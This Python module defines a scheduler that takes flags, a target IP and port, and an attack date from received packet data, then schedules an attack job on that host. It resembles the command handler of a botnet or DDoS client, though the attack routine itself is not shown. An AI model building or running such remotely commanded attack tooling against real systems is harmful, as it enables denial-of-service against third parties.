from app.models import singleton, PacketData
from app.tasks.attakTarget import AttackTarget
from .baseScheduler import BaseScheduler
from datetime import datetime


@singleton
class AttackScheduler:
    def __init__(self):
        self.baseScheduler = BaseScheduler()
        self.scheduler = self.baseScheduler.scheduler
        self.attackTarget = AttackTarget()
        self.packetData = PacketData()

    def onDataReceived(self):
        actions = {
            0: self.reset,
            1: self.setAttack,
            2: lambda: print("암호 관련"),
            3: self.attackTarget.stop,
        }
        action = actions.get(self.packetData.flag, lambda: print("Unknown flag"))
        action()

    def setAttack(self):
        dateNow = datetime.now()
        (y, ds, h) = self.packetData.atkDate
        (m, d) = self.day2monthDay(ds)
        runDate = datetime(
            dateNow.year + y,
            m,
            d,
            h,
            1,
        )

        ip = ".".join(self.packetData.ipAddr)
        port = self.packetData.portNum
        self.attackTarget.target = f"{ip}:{port}"

        self.scheduler.add_job(
            func=self.attackTarget.attack,
            trigger="date",
            run_date=runDate,
            id="attack",
            replace_existing=True,
        )

    def reset(self):
        self.scheduler.remove_job(id="attack")

    def day2monthDay(self, days):
        month_days = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
        month = 1
        for days_in_month in month_days:
            if days <= days_in_month:
                day = days
                return month, day
            else:
                days -= days_in_month
                month += 1
        raise ValueError("out of range: days")
